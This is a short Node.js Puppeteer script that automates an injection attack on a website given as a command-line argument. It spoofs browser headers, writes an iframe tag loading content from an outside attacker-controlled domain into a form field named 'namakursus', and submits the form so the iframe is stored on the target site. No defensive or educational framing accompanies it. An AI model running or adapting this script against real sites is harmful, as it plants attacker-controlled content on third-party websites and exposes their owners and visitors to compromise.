const puppeteer = require('puppeteer');

async function launchIframeInjection(targetUrl) {
  try {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    await page.setExtraHTTPHeaders({
      'Referer': 'https://google.com',
      'Accept-Language': 'en-US,en;q=0.9'
    });

    console.log("🌐 Navigating to:", targetUrl);
    await page.goto(targetUrl, { waitUntil: 'domcontentloaded' });

    const iframeTag = `<iframe src="https://yourdomain.com/tronUploaderIframe.html" width="400" height="200"></iframe>`;
    
    const injected = await page.evaluate((code) => {
      const input = document.querySelector('input[name="namakursus"]');
      if (input) {
        input.value = code;
        return true;
      }
      return false;
    }, iframeTag);

    if (injected) {
      console.log("💉 Iframe injected. Submitting...");
      await Promise.all([
        page.waitForNavigation({ waitUntil: 'domcontentloaded' }),
        page.evaluate(() => {
          document.querySelector('form').submit();
        })
      ]);
    } else {
      console.log("❌ Could not inject iframe.");
    }

    const result = await page.content();
    console.log("📄 Result (partial):\n", result.slice(0, 500));
    await browser.close();
  } catch (err) {
    console.error("❌ Puppeteer error:", err.message);
  }
}

const input = process.argv[2];
if (!input) {
  console.error("❌ Provide base URL e.g. https://target.com");
  process.exit(1);
}

launchIframeInjection(input);
